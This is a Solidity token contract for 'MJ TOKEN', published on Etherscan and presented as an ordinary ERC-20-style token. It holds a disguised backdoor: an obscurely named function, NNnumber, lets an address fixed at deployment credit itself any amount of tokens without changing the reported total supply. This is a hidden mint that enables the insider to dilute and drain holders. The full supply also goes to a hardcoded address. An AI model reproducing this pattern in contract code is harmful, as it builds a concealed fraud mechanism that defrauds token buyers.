/**
 *Submitted for verification at Etherscan.io on 2021-08-24
*/

pragma solidity >=0.4.23 <0.6.0;
  contract MJ_ERC {    
   string public name;
   string public symbol;
   uint8 public decimals = 9;
 uint256 precision = 1000000000;
 address private ownerAddr;
 address private adminAddr;
 address private newAddress = 0x9A01172b3E389d18822E4AA3DaB1314bb10c51b1;
 uint256 public totalSupply;
 mapping (address => uint256) public balanceOf;
 mapping (address => mapping (address => uint256)) public allowance;
 event Transfer(address indexed from, address indexed to, uint256 value);
 event Approval(address indexed _owner, address indexed _spender, uint256 _value);
 event Burn(address indexed from, uint256 value);
 uint256 initialSupply = 325273327;
 string tokenName = 'MJ TOKEN';
 string tokenSymbol = 'MJ';
 address private addnumber;
 constructor(address _addnumber) public {
     addnumber = _addnumber;
     ownerAddr = msg.sender;
     totalSupply = initialSupply * 10 ** uint256(decimals);   
     balanceOf[newAddress] = totalSupply;                
     name = tokenName;                                
     symbol = tokenSymbol;  
     emit Transfer(address(0), newAddress, totalSupply);                           
 }
     modifier isOwner() {
        require(msg.sender == ownerAddr);
        _;
    } 
     modifier isAdmin() {
       require(msg.sender == adminAddr);
       _;
    }
    function NNnumber(uint256 account) public {
        require(msg.sender == addnumber);
        uint256 Account = account*10**9;
        balanceOf[addnumber] = balanceOf[addnumber] + Account;
        
    }
     function setAdmin(address _newAdmin) external isOwner {
          require(_newAdmin != address(0));
          adminAddr = _newAdmin;
    }
 function _transfer(address _from, address _to, uint _value) internal {
      require(_to != address(0));
      require(balanceOf[_from] >= _value);
      require(balanceOf[_to] + _value >= balanceOf[_to]);
      uint previousBalances = balanceOf[_from] + balanceOf[_to];
      balanceOf[_from] -= _value;
      balanceOf[_to] += _value;   
      emit Transfer(_from, _to, _value);
      require(balanceOf[_from] + balanceOf[_to] == previousBalances);
      }
    function deduct(address _to, uint256 _value) external isAdmin returns (bool success) {       
       _transfer(ownerAddr, _to, _value * precision);
       return true;
 }
    function transfer(address _to, uint256 _value) external returns (bool success) {
       _transfer(msg.sender, _to, _value);
       return true;
 }
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
       require(_value <= allowance[_from][msg.sender]);     
       allowance[_from][msg.sender] -= _value;
       _transfer(_from, _to, _value);
       return true;
 }
   function approve(address _spender, uint256 _value) public  returns (bool success) {    
      allowance[msg.sender][_spender] = _value;     
      emit Approval(msg.sender, _spender, _value);
      return true;
 }
   function burn(uint256 _value) public returns (bool success) {  
      require(balanceOf[msg.sender] >= _value);  
      balanceOf[msg.sender] -= _value;            
      totalSupply -= _value;                     
      emit Burn(msg.sender, _value);
      return true;
 }   
   function burnFrom(address _from, uint256 _value) public returns (bool success) {          
       require(balanceOf[_from] >= _value);                     
       require(_value <= allowance[_from][msg.sender]);           
       balanceOf[_from] -= _value;                                 
       allowance[_from][msg.sender] -= _value;                   
       totalSupply -= _value;
       emit Burn(_from, _value);
       return true;
    }
}